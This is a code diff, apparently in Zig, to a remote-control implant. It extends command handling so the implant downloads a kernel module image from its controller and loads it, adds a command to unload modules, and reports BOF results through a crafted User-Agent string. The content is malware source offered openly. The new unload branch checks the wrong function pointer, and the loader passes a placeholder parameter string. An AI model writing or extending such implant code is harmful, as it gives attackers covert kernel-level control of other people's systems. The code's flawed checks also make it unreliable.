@@ -17,7 +17,8 @@ const debug_proxy_port = 8080;
 const ImplantActions = struct {
     const Self = @This();
 
-    kmodLoader: ?*const fn (mod_name: [*:0]const u8) callconv(.C) c_int = null,
+    kmodLoad: ?*const fn (module_image: [*]const u8, len: usize, param_values: [*:0]const u8) callconv(.C) c_int = null,
+    kmodRemove: ?*const fn (mod_name: [*:0]const u8, flags: u32) callconv(.C) c_int = null,
 
     pub fn attachFunctionality(self: *Self, bofObj: bof.Object) void {
         const fields = @typeInfo(Self).Struct.fields;
@@ -147,6 +148,10 @@ const PendingBof = struct {
     is_persistent: bool = false,
     launcher_error_code: i32 = 0,
 };
+
+fn generateUserAgentString(allocator: std.mem.Allocator, bof_exit_code_or_launcher_error: i32) ![]const u8 {
+    return try std.fmt.allocPrint(allocator, "result:{d}", .{bof_exit_code_or_launcher_error});
+}
 
 fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.json.Value) !void {
     const bof_argv = if (root.object.get("argv")) |value| bof_argv: {
@@ -355,17 +360,29 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
                     .launcher_error_code = @abs(@intFromError(err)) - 1000,
                 });
             };
-            // tasked for kernel module loading?
+        // tasked for kernel module loading?
         } else if (std.mem.eql(u8, cmd_prefix, "kmod")) {
-            if (implant_actions.kmodLoader == null) {
+            if (implant_actions.kmodLoad == null) {
                 std.log.info("Kernel module loading not implemented", .{});
                 return error.BadData;
             }
 
-            std.log.info("Loading kernel module: {s}", .{cmd_name});
-            _ = implant_actions.kmodLoader.?("mzet kmod loader here");
+            const kmod_path = root.object.get("path").?.string;
+            const kmod_content = try fetchBlob(allocator, state, kmod_path);
+            defer allocator.free(kmod_content);
 
-            // tasked for custom command execution?
+            std.log.info("Loading kernel module: {s}", .{cmd_name});
+            _ = implant_actions.kmodLoad.?(kmod_content.ptr, kmod_content.len, "paaarams");
+        } else if (std.mem.eql(u8, cmd_prefix, "kmodrm")) {
+           if (implant_actions.kmodLoad == null) {
+                std.log.info("Kernel module loading not implemented", .{});
+                return error.BadData;
+            }
+
+            std.log.info("Removing kernel module: {s}", .{cmd_name});
+            _ = implant_actions.kmodRemove.?(@ptrCast(cmd_name.ptr), 0);
+
+        // tasked for custom command execution?
         } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
             std.log.info("Executing builtin command: {s}", .{cmd_name});
 
@@ -380,10 +397,6 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
             }
         }
     }
-}
-
-fn generateUserAgentString(allocator: std.mem.Allocator, bof_exit_code_or_launcher_error: i32) ![]const u8 {
-    return try std.fmt.allocPrint(allocator, "result:{d}", .{bof_exit_code_or_launcher_error});
 }
 
 fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
